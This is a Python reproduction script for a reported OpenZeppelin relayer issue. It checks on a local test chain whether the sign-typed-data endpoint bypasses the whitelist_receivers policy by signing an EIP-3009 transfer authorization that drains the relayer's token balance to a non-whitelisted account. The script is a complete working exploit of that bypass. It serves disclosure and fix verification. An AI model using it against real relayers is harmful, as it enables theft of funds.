"""Scenario 912: the sign endpoints skip whitelist_receivers.

https://github.com/OpenZeppelin/openzeppelin-relayer/issues/912

Setup: anvil mining on demand. A test token with EIP-3009
transferWithAuthorization (contracts/AuthToken.sol, the signed transfer USDC
accepts) is deployed and 1,000 tokens are minted to the Relayer's address.
The relayer's policy is whitelist_receivers = [account #1].

Steps:
  1. control: a transaction request to account #2 must be refused by the policy
  2. the driver builds a TransferWithAuthorization from the Relayer's address to
     account #2 for the whole balance and asks POST /sign-typed-data for a
     signature over its domain separator and struct hash
  3. account #2 submits transferWithAuthorization with that signature itself

Outcome:
  reproduces  the policy refuses the transaction, the endpoint signs anyway and
              the token balance moves to the non-whitelisted account
  fixed       the endpoint refuses to sign, or what it returns does not authorize
              the transfer
  inconclusive  the control fails (the policy is not active), so the setup
              shows nothing about the sign endpoint
"""
import json
import os
import time

from eth_abi import encode
from eth_utils import keccak, to_checksum_address

from labkit import ACCOUNT_1, ACCOUNT_2, ACCOUNT_9, RID, SENDER, api, log, rpc, wait_ready, write_result

ART = json.load(open("/lab/AuthToken.json"))
AMOUNT = 1_000 * 10**6


def selector(sig):
    return keccak(text=sig)[:4]


def send(frm, to, data, value=0):
    params = {"from": frm, "data": "0x" + data.hex(), "value": hex(value), "gas": hex(3_000_000)}
    if to:
        params["to"] = to
    h = rpc("eth_sendTransaction", [params])
    for _ in range(50):
        r = rpc("eth_getTransactionReceipt", [h])
        if r:
            return r
        time.sleep(0.2)
    raise RuntimeError(f"no receipt for {h}")


def call(to, data):
    return bytes.fromhex(rpc("eth_call", [{"to": to, "data": "0x" + data.hex()}, "latest"])[2:])


def balance(token, who):
    return int.from_bytes(call(token, selector("balanceOf(address)") + encode(["address"], [who])), "big")


def main():
    wait_ready()
    r = send(ACCOUNT_9, None, bytes.fromhex(ART["bytecode"][2:]))
    token = to_checksum_address(r["contractAddress"])
    send(ACCOUNT_9, token, selector("mint(address,uint256)") + encode(["address", "uint256"], [SENDER, AMOUNT]))
    log(f"token {token} deployed; Relayer address {SENDER} holds {balance(token, SENDER)}; account #2 holds {balance(token, ACCOUNT_2)}")

    # 1. control: the transaction policy must refuse a non-whitelisted receiver
    code, j = api("POST", f"/api/v1/relayers/{RID}/transactions",
                  {"to": ACCOUNT_2, "value": 1, "data": "0x", "speed": "fast", "gas_limit": 21000})
    control = {"http_status": code, "message": j.get("error") or j.get("message") or str(j)[:200]}
    log(f"control: transaction to non-whitelisted {ACCOUNT_2} -> HTTP {code} {control['message']}")
    policy_active = code in (400, 403, 422)

    # 2. the same receiver through the sign endpoint
    chain_id = int(rpc("eth_chainId"), 16)
    domain = keccak(encode(
        ["bytes32", "bytes32", "bytes32", "uint256", "address"],
        [keccak(text="EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
         keccak(text="Lab USD"), keccak(text="2"), chain_id, token]))
    onchain_domain = call(token, selector("DOMAIN_SEPARATOR()"))
    assert domain == onchain_domain, "domain separator mismatch"
    valid_before = int(rpc("eth_getBlockByNumber", ["latest", False])["timestamp"], 16) + 3600
    nonce = keccak(text=f"lab-912-{time.time()}")
    typehash = keccak(text="TransferWithAuthorization(address from,address to,uint256 value,uint256 validAfter,uint256 validBefore,bytes32 nonce)")
    struct = keccak(encode(["bytes32", "address", "address", "uint256", "uint256", "uint256", "bytes32"],
                           [typehash, SENDER, ACCOUNT_2, AMOUNT, 0, valid_before, nonce]))
    code, j = api("POST", f"/api/v1/relayers/{RID}/sign-typed-data",
                  {"domain_separator": "0x" + domain.hex(), "hash_struct_message": "0x" + struct.hex()})
    sig = j.get("data") or {}
    log(f"sign-typed-data for TransferWithAuthorization(to={ACCOUNT_2}, value={AMOUNT}) -> HTTP {code}, signature returned {bool(sig.get('sig') or sig.get('r'))}")
    observed = {
        "token": token,
        "whitelist_receivers": [ACCOUNT_1],
        "control_transaction": control,
        "sign_typed_data_http_status": code,
        "sign_typed_data_error": None if sig else (j.get("error") or j.get("message") or str(j)[:200]),
    }
    if not policy_active:
        write_result("inconclusive", f"the transaction policy did not refuse a non-whitelisted receiver (HTTP {code}); the setup is wrong", observed)
        return
    if code != 200 or not sig:
        write_result("fixed", f"sign-typed-data refused the authorization (HTTP {code}) while whitelist_receivers excludes the payee", observed)
        return

    # 3. anyone can submit the signed authorization
    v = int(sig["v"])
    v = v + 27 if v < 27 else v
    rr, ss = bytes.fromhex(sig["r"].removeprefix("0x").rjust(64, "0")), bytes.fromhex(sig["s"].removeprefix("0x").rjust(64, "0"))
    data = selector("transferWithAuthorization(address,address,uint256,uint256,uint256,bytes32,uint8,bytes32,bytes32)") + encode(
        ["address", "address", "uint256", "uint256", "uint256", "bytes32", "uint8", "bytes32", "bytes32"],
        [SENDER, ACCOUNT_2, AMOUNT, 0, valid_before, nonce, v, rr, ss])
    try:
        rc = send(ACCOUNT_2, token, data)
        status = int(rc["status"], 16)
        tx_hash = rc["transactionHash"]
    except RuntimeError as e:
        status, tx_hash = 0, str(e)[:200]
    after = {"relayer_address": balance(token, SENDER), "account_2": balance(token, ACCOUNT_2)}
    observed.update({"transfer_with_authorization": {"submitted_by": ACCOUNT_2, "tx": tx_hash, "status": status}, "balances_after": after})
    log(f"transferWithAuthorization submitted by account #2: status {status}; balances after {after}")
    if status == 1 and after["account_2"] == AMOUNT:
        write_result("reproduces", f"whitelist_receivers refused a transaction to account #2 (HTTP {control['http_status']}), yet /sign-typed-data signed an EIP-3009 authorization that moved the Relayer address's {AMOUNT // 10**6} tokens to it", observed)
    else:
        write_result("fixed", f"the endpoint answered HTTP 200 but the signature did not authorize the transfer (status {status})", observed)


if __name__ == "__main__":
    main()
